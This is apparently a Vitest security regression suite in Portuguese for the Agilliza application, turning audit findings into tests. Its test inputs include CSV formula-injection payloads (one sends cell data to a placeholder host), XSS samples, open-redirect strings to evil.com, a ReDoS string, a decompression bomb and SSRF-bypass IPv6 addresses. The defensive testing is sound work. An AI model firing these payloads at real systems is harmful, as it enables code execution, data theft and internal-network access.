/**
 * Auditoria adversarial independente do pedido de 26/10/2026 (eco-aud): cada quebra achada no
 * Agilliza vira teste permanente aqui (as do banco estão no pgTAP 755–758 do Agilliza Tech).
 */
import { describe, expect, it } from "vitest";
import { deflateSync } from "node:zlib";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { extrairTextoPdf, textoDoConteudo } from "./financeiro/pdf-texto.server";
import { celulaCSV } from "./relatorios/report-docx";
import { hrefSeguro, srcSeguro } from "./conhecimento/markdown";

describe("eco-aud: leitor de boleto em PDF não trava o servidor", () => {
  it("fluxo de texto montado para retrocesso exponencial termina rápido (ReDoS)", () => {
    // "[" + "()" × 28 sem "]…TJ" depois: antes levava ~3 s (dobrando a cada par; 40 pares = horas).
    const malicioso = "BT [" + "()".repeat(28) + " ET";
    const t0 = performance.now();
    textoDoConteudo(malicioso);
    expect(performance.now() - t0).toBeLessThan(300);
  });

  it("muitos colchetes sem fechar também não viram tempo quadrático", () => {
    const malicioso = "[".repeat(200_000);
    const t0 = performance.now();
    textoDoConteudo(malicioso);
    expect(performance.now() - t0).toBeLessThan(1500);
  });

  it("bomba de descompressão não estoura a memória: o fluxo grande demais é ignorado", () => {
    const enorme = deflateSync(Buffer.alloc(64 * 1024 * 1024, 0x20)); // 64 MB de espaços em ~64 KB
    const pdf = Buffer.concat([
      Buffer.from("%PDF-1.4\n1 0 obj << /Filter /FlateDecode /Length 1 >>\nstream\n", "latin1"),
      enorme,
      Buffer.from("\nendstream\nendobj\n%%EOF", "latin1"),
    ]);
    expect(() => extrairTextoPdf(pdf)).not.toThrow();
    expect(extrairTextoPdf(pdf)).toBe("");
  });

  it("o texto legítimo continua sendo lido", () => {
    expect(textoDoConteudo("BT [(Linha) -300 (digitavel)] TJ ET")).toContain("Linha digitavel");
  });
});

describe("eco-aud: exportação CSV não executa fórmula no Excel", () => {
  it("descrição vinda do extrato com fórmula sai neutralizada", () => {
    for (const perigo of ['=HYPERLINK("http://x/?"&A1,"ver")', "+cmd|' /C calc'!A0", "@SUM(1+1)", "-2+3+cmd|' /C calc'!A0", "\t=1", "\r=1"]) {
      expect(celulaCSV(perigo).startsWith('"\'')).toBe(true);
    }
  });
  it("número negativo e texto comum continuam iguais", () => {
    expect(celulaCSV("-1.234,56")).toBe('"-1.234,56"');
    expect(celulaCSV("R$ -10,00")).toBe('"R$ -10,00"');
    expect(celulaCSV('Pix de "Maria"')).toBe('"Pix de ""Maria"""');
  });
});

describe("eco-aud: link e imagem de artigo/News não saem do domínio", () => {
  it("barra invertida e tab depois da barra viram endereço externo no navegador: recusados", () => {
    for (const s of ["/\\evil.com", "/\\\\evil.com", "/\t/evil.com", "/%5Cevil.com", "/\n/evil.com"]) {
      expect(hrefSeguro(s)).toBeNull();
      expect(srcSeguro(s)).toBeNull();
    }
  });
  it("caminho interno comum continua valendo", () => {
    expect(hrefSeguro("/base-de-conhecimento/artigo-1")).toBe("/base-de-conhecimento/artigo-1");
    expect(srcSeguro("/imagens/capa.png")).toBe("/imagens/capa.png");
  });
});

describe("eco-aud: chat — quem só VÊ as conversas não envia", () => {
  const fonte = readFileSync(join(__dirname, "chat", "chat.functions.ts"), "utf8");
  const bloco = fonte.slice(fonte.indexOf("const ACOES = {"), fonte.indexOf("} as const;"));
  const acoes = [...bloco.matchAll(/^ {2}(\w+): \{/gm)].map((m) => m[1]);
  const lista = (nome: string) =>
    new Set(
      [...(fonte.match(new RegExp(`${nome} = new Set<AcaoChat>\\(\\[([\\s\\S]*?)\\]\\)`))?.[1] ?? "").matchAll(/"(\w+)"/g)].map(
        (m) => m[1],
      ),
    );
  const leitura = lista("ACOES_DE_LEITURA");
  const escrita = lista("ACOES_DE_ESCRITA");
  const arroba = lista("SO_ARROBA");

  it("toda ação do chat está classificada (ação nova precisa dizer se lê ou escreve)", () => {
    expect(acoes.length).toBeGreaterThan(40);
    expect(acoes.filter((a) => !leitura.has(a) && !escrita.has(a) && !arroba.has(a))).toEqual([]);
    expect([...leitura].filter((a) => escrita.has(a))).toEqual([]);
  });
  it("enviar, apagar, encaminhar, criar grupo e abrir conversa exigem 'Enviar mensagens'", () => {
    for (const a of ["enviar", "apagar", "encaminhar", "criarGrupo", "adicionar", "abrirCom", "abrirPorArroba", "editar"]) {
      expect(escrita.has(a)).toBe(true);
    }
    expect(fonte).toMatch(/pessoaDoChat\(data\.canal as CanalChat, permissaoDaAcao\(/);
    expect(fonte).toMatch(/pessoaDoChat\(data\.canal, "create"\)/); // anexo
    const pessoa = readFileSync(join(__dirname, "chat", "pessoa.server.ts"), "utf8");
    expect(pessoa).toMatch(/exigirChat === "create" \? "create" : "view"/);
  });
});

describe("eco-aud: simular na base do assinante grava na conta dele", () => {
  it("as ações que gravam exigem saas.contas › edit, não só ver", () => {
    const f = readFileSync(join(__dirname, "plataforma", "simulacao-na-conta.functions.ts"), "utf8");
    expect(f).not.toMatch(/exigirPermissao\(\["saas\.contas", "view"\]\)/);
    expect(f.match(/exigirPermissao\(\["saas\.contas", "edit"\]\)/g)?.length).toBe(2);
    const s = readFileSync(join(__dirname, "simulacao", "simulacoes.functions.ts"), "utf8");
    expect(s).toMatch(/_modulo: "saas\.contas",\s*_acao: "edit"/);
  });
});

describe("eco-aud: documento enviado pelo portal do cliente é o que diz ser", () => {
  it("HTML/SVG com nome de PDF é recusado; PDF e foto passam pelo tipo verdadeiro", async () => {
    const { tipoDoDocumento } = await import("./portal/cliente-portal.functions");
    const de = (s: string) => new Uint8Array(Buffer.from(s, "latin1"));
    expect(tipoDoDocumento(de("<html><script>alert(1)</script></html>"))).toBeNull();
    expect(tipoDoDocumento(de('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'))).toBeNull();
    expect(tipoDoDocumento(de("%PDF-1.7\n..."))).toEqual({ mime: "application/pdf", ext: "pdf" });
    expect(tipoDoDocumento(new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0, 0]))).toEqual({ mime: "image/jpeg", ext: "jpg" });
    const fonte = readFileSync(join(__dirname, "portal", "cliente-portal.functions.ts"), "utf8");
    expect(fonte).toMatch(/contentType: tipo\.mime/);
    expect(fonte).not.toMatch(/contentType: data\.mime_type/);
  });
});

describe("eco-aud: Scan IA não cria cliente com CPF de dígito errado", () => {
  it("a leitura avulsa confere o dígito verificador antes de criar", () => {
    const fonte = readFileSync(join(__dirname, "crm", "scan-ia.functions.ts"), "utf8");
    const corpo = fonte.slice(fonte.indexOf("async function garantirClientePorDocumento"));
    expect(corpo.slice(0, 1500)).toMatch(/!existente && !\(documento\.length === 11 \? cpfValido\(documento\) : cnpjValido\(documento\)\)/);
  });
});

describe("eco-aud: prévia de link do chat não visita a rede interna (IPv6)", () => {
  it("formas de IPv6 que escapavam da lista são recusadas; endereço público passa", async () => {
    const { ipPrivado, urlPermitida } = await import("./chat/previa-link-regras");
    for (const ip of ["::7f00:1", "::127.0.0.1", "fec0::1", "2002:7f00:1::1", "2002:a00:1::", "2001:0:4136:e378::1", "64:ff9b::a00:1", "::ffff:127.0.0.1", "::ffff:7f00:1", "fe80::1", "fd00::1", "ff02::1", "::", "::1"]) {
      expect(ipPrivado(ip)).toBe(true);
    }
    for (const ip of ["2606:4700:4700::1111", "2a03:2880:f12f:83:face:b00c::25de", "::ffff:8.8.8.8", "2002:808:808::1"]) {
      expect(ipPrivado(ip)).toBe(false);
    }
    expect(urlPermitida("http://[::127.0.0.1]/")).toBeNull();
    expect(urlPermitida("http://[fec0::1]/")).toBeNull();
  });
});

describe("eco-aud: caixa IMAP conecta no IP conferido (sem DNS rebinding)", () => {
  it("o cliente IMAP recebe o IP já conferido; rede interna (inclusive IPv6) é recusada", async () => {
    const { destinoImap, enderecoPermitido } = await import("./codigos/rede.server");
    await expect(destinoImap("127.0.0.1")).rejects.toThrow(/não permitido/);
    expect(await enderecoPermitido("[::127.0.0.1]")).toBeNull();
    expect(await enderecoPermitido("fec0::1")).toBeNull();
    expect(await destinoImap("8.8.8.8")).toEqual({ host: "8.8.8.8" });
    for (const arq of ["leitor.server.ts", "teste-conexao.server.ts"]) {
      const f = readFileSync(join(__dirname, "codigos", arq), "utf8");
      expect(f).toMatch(/new ImapFlow\(\{\s*\.\.\.\(await destinoImap\(caixa\.imap_host\)\)/);
      expect(f).not.toMatch(/host: caixa\.imap_host/);
    }
  });
});
